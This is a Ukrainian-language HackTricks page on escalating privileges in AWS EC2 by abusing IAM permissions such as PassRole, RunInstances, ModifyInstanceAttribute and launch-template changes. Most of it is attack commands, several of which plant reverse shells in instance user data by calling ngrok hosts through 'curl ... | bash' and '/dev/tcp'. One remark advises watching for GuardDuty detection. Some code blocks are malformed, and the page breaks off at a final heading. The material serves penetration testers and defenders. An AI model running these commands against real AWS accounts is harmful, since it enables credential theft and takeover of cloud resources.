# AWS - –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ EC2

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## EC2

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ EC2** –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä, –ø—Ä–∏–∫—Ä—ñ–ø–∏—Ç–∏ –¥–æ –Ω—å–æ–≥–æ —Ä–æ–ª—å IAM, –∞ –ø–æ—Ç—ñ–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞**, —â–æ–± –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ä–æ–ª—ñ IAM –∑ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö.

* **–î–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ SSH**

–ó–∞–ø—É—Å—Ç—ñ—Ç—å –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Å—Ç–≤–æ—Ä–µ–Ω–∏–π –∫–ª—é—á ssh** (`--key-name`), –∞ –ø–æ—Ç—ñ–º –ø—ñ–¥–∫–ª—é—á—ñ—Ç—å—Å—è –¥–æ –Ω—å–æ–≥–æ —á–µ—Ä–µ–∑ ssh (—è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π, –º–æ–∂–ª–∏–≤–æ, –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è –¥–æ–∑–≤—ñ–ª `ec2:CreateKeyPair`).
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **–î–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ –æ–±–µ—Ä–Ω–µ–Ω—É –æ–±–æ–ª–æ–Ω–∫—É –≤ –¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**

–í–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** (`--user-data`), —è–∫—ñ –Ω–∞–¥—ñ—à–ª—é—Ç—å –≤–∞–º **–æ–±–µ—Ä–Ω–µ–Ω—É –æ–±–æ–ª–æ–Ω–∫—É**. –¶–∏–º —Å–ø–æ—Å–æ–±–æ–º –≤–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –≥—Ä—É–ø—É –±–µ–∑–ø–µ–∫–∏.
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
–ë—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ –∑ GuradDuty, —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ä–æ–ª—ñ IAM –ø–æ–∑–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–æ–º:

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ –±—É–¥—å-—è–∫–æ—ó —Ä–æ–ª—ñ EC2, –ø—Ä–∏—î–¥–Ω–∞–Ω–æ—ó –¥–æ —ñ—Å–Ω—É—é—á–∏—Ö –ø—Ä–æ—Ñ—ñ–ª—ñ–≤ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤.

#### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ ECS

–ó —Ü–∏–º –Ω–∞–±–æ—Ä–æ–º –¥–æ–∑–≤–æ–ª—ñ–≤ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä EC2 —Ç–∞ –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞ ECS**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, —Å–ª—É–∂–±–∏ ECS –±—É–¥—É—Ç—å **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–µ–∫–∑–µ–º–ø–ª—è—Ä–∞ EC2**, –¥–æ —è–∫–æ–≥–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø, —ñ –ø–æ—Ç—ñ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ –ø—Ä–æ–Ω–∏–∫–Ω—É—Ç–∏ –≤ —Ü—ñ —Å–ª—É–∂–±–∏ (–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ Docker) —Ç–∞ **–≤–∫—Ä–∞—Å—Ç–∏ —ó—Ö –ø—Ä–∏—î–¥–Ω–∞–Ω—ñ —Ä–æ–ª—ñ ECS**.

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

–©–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ **–∑–º—É—Å–∏—Ç–∏ —Å–ª—É–∂–±–∏ ECS –ø—Ä–∞—Ü—é–≤–∞—Ç–∏** –Ω–∞ —Ü—å–æ–º—É –Ω–æ–≤–æ–º—É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ EC2, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

–Ø–∫—â–æ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä**, –∞–ª–µ –º–∞—î—Ç–µ –¥–æ–∑–≤—ñ–ª `ecs:RegisterContainerInstance`, –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä —É—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞ —Ç–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–µ–Ω—Ç–æ–≤–∞–Ω–∏–π –∞—Ç–∞–∫—É.

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–∏–π –ø—ñ–¥–π–æ–º –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π ECS, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–≤–¥–∞–Ω—å.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—é, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ **–∑–º—ñ–Ω–∏—Ç–∏ —Ä–æ–ª—å IAM –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞**, —â–æ–± –≤—ñ–Ω –º—ñ–≥ –≤–∫—Ä–∞—Å—Ç–∏ –Ω–æ–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ.\
–û—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –º–æ–∂–µ –º–∞—Ç–∏ –ª–∏—à–µ 1 —Ä–æ–ª—å, —è–∫—â–æ –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ **–≤–∂–µ –º–∞—î —Ä–æ–ª—å** (–∑–∞–≥–∞–ª—å–Ω–∏–π –≤–∏–ø–∞–¥–æ–∫), –≤–∞–º —Ç–∞–∫–æ–∂ –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è **`iam:RemoveRoleFromInstanceProfile`**.

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

–Ø–∫—â–æ **–ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –º–∞—î —Ä–æ–ª—å**, –∞—Ç–∞–∫—É—é—á–∏–π **–Ω–µ –º–æ–∂–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –π–æ–≥–æ**, —î —â–µ –æ–¥–∏–Ω –æ–±—Ö—ñ–¥–Ω–∏–π —à–ª—è—Ö. –í—ñ–Ω –º–æ–∂–µ **–∑–Ω–∞–π—Ç–∏** **–ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –±–µ–∑ —Ä–æ–ª—ñ** –∞–±–æ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π** (`iam:CreateInstanceProfile`), **–¥–æ–¥–∞—Ç–∏** **—Ä–æ–ª—å** –¥–æ —Ü—å–æ–≥–æ **–ø—Ä–æ—Ñ—ñ–ª—é –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** (—è–∫ –≤–∂–µ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–æ—Å—è —Ä–∞–Ω—ñ—à–µ), —ñ **–ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É –µ–∫–∑–µ–º–ø–ª—è—Ä—É:

* –Ø–∫—â–æ —É –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ **–Ω–µ–º–∞—î –∂–æ–¥–Ω–æ–≥–æ –ø—Ä–æ—Ñ—ñ–ª—é** –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ (`ec2:AssociateIamInstanceProfile`) \* 

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–∏–π –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2 (–ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä AWS EC2 —ñ –º–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–æ–∑–≤–æ–ª–∏ –∞–±–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Å—Ç–∞—Ç—É—Å –ø—Ä–æ—Ñ—ñ–ª—é –µ–∫–∑–µ–º–ø–ª—è—Ä–∞).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

–ó —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–æ–º, —Ç–æ–º—É —è–∫—â–æ –∞—Ç–∞–∫–∞ –≤–∂–µ –º–∞–ª–∞ –¥–æ—Å—Ç—É–ø –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞, –≤—ñ–Ω –∑–º–æ–∂–µ –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è –±—ñ–ª—å—à–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Ä–æ–ª–µ–π –ø—Ä–æ—Ñ—ñ–ª—é –µ–∫–∑–µ–º–ø–ª—è—Ä–∞, –∑–º—ñ–Ω–∏–≤—à–∏ —Ç–æ–π, —â–æ –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –Ω–∏–º.

* –Ø–∫—â–æ **–µ—Å—Ç—å –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–¥–∞–ª–∏—Ç–∏** –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ (`ec2:DisassociateIamInstanceProfile`) —Ç–∞ **–ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏** –π–æ–≥–æ \*
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* –∞–±–æ **–∑–∞–º—ñ–Ω—ñ—Ç—å** **–ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
```
–ó–∞–º—ñ–Ω—ñ—Ç—å –∞—Å–æ—Ü—ñ–∞—Ü—ñ—é –ø—Ä–æ—Ñ—ñ–ª—é IAM –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<–∑–Ω–∞—á–µ–Ω–Ω—è> --association-id <–∑–Ω–∞—á–µ–Ω–Ω—è>
```
```
````
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2 (–ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä AWS EC2 —ñ –º–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–æ–∑–≤–æ–ª–∏ –∞–±–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Å—Ç–∞—Ç—É—Å –ø—Ä–æ—Ñ—ñ–ª—é –µ–∫–∑–µ–º–ø–ª—è—Ä–∞).

### `ec2:RequestSpotInstances`,`iam:PassRole`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ **`ec2:RequestSpotInstances` —Ç–∞ `iam:PassRole`** –º–æ–∂–µ **–∑–∞–ø–∏—Ç–∞—Ç–∏** **–µ–∫–∑–µ–º–ø–ª—è—Ä Spot** –∑ –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ—é **—Ä–æ–ª–ª—é EC2** —Ç–∞ **rev shell** –≤ **–¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**.\
–ü—ñ—Å–ª—è –∑–∞–ø—É—Å–∫—É –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –≤—ñ–Ω –º–æ–∂–µ **–≤–∏–∫—Ä–∞—Å—Ç–∏ —Ä–æ–ª—å IAM**.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
### `ec2:ModifyInstanceAttribute`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—é **`ec2:ModifyInstanceAttribute`** –º–æ–∂–µ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤. –°–µ—Ä–µ–¥ –Ω–∏—Ö –≤—ñ–Ω –º–æ–∂–µ **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤—ñ–Ω –º–æ–∂–µ –∑—Ä–æ–±–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥–∞–Ω—ñ**. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **–æ–±–µ—Ä–Ω–µ–Ω–æ–≥–æ —à–µ–ª—É –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ EC2**.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∞—Ç—Ä–∏–±—É—Ç–∏ –º–æ–∂–Ω–∞ **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ª–∏—à–µ –ø—ñ–¥ —á–∞—Å –∑—É–ø–∏–Ω–∫–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞**, —Ç–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ **`ec2:StopInstances`** —Ç–∞ **`ec2:StartInstances`**.
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ –±—É–¥—å-—è–∫–æ—ó —Ä–æ–ª—ñ IAM EC2, –ø—Ä–∏—î–¥–Ω–∞–Ω–æ—ó –¥–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä—É.

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate` —Ç–∞ `ec2:ModifyLaunchTemplate`** –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–Ω–æ–≤—É –≤–µ—Ä—Å—ñ—é —à–∞–±–ª–æ–Ω—É –∑–∞–ø—É—Å–∫—É** –∑ **–æ–±–æ—Ä–æ—Ç–Ω–∏–º shell –≤** **–¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** —Ç–∞ **–±—É–¥—å-—è–∫–æ—é —Ä–æ–ª–ª—é IAM EC2 –Ω–∞ –Ω—å–æ–º—É**, –∑–º—ñ–Ω–∏—Ç–∏ –≤–µ—Ä—Å—ñ—é –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —Ç–∞ **–±—É–¥—å-—è–∫—É –≥—Ä—É–ø—É –∞–≤—Ç–æ–º–∞—Å—à—Ç–∞–±—É–≤–∞–Ω–Ω—è**, **—è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î** —Ü–µ–π **—à–∞–±–ª–æ–Ω –∑–∞–ø—É—Å–∫—É**, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó** –∞–±–æ **–≤–µ—Ä—Å—ñ—ó –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, –±—É–¥–µ **–ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ —à–∞–±–ª–æ–Ω—É —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –æ–±–æ—Ä–æ—Ç–Ω–∏–π shell.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–∏–π –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2.

### `autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`

